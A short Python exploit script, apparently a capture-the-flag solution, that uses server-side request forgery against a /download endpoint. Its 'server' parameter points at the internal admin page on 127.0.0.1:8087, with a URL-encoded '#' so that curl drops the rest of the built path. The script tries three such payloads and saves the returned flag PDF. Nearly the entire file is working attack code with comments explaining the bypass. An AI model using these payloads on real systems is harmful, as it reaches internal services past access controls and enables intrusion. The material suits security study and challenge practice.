"""Access /admin via SSRF on internal port 8087 using # fragment trick."""
import requests

T = "http://10.82.168.213"

# App runs on 8087. URL built: server + '/public-docs.../1.pdf'
# With %23 (URL-encoded #), pycurl gets: http://127.0.0.1:8087/admin#/public-docs.../1.pdf
# curl strips fragment -> requests http://127.0.0.1:8087/admin
# Since request comes from localhost, /admin returns flag.pdf

payloads = [
    "http://127.0.0.1:8087/admin%23",
    "http://127.0.0.1:8087/admin?x=%23",
    "127.0.0.1:8087/admin%23",
]

for p in payloads:
    url = f"{T}/download?server={p}&id=1"
    print(f"Trying: server={p}")
    r = requests.get(url, timeout=10)
    ct = r.headers.get("Content-Type", "")
    print(f"  Status: {r.status_code}, Len: {len(r.content)}, CT: {ct}")

    if len(r.content) > 100:
        with open("plantphoto_hunt/flag.pdf", "wb") as f:
            f.write(r.content)
        print("  >> Saved to plantphoto_hunt/flag.pdf!")
        # Show raw bytes for text extraction
        print(f"  >> First 300 bytes: {r.content[:300]}")
        break
    else:
        print(f"  Body: {r.text}")
    print()
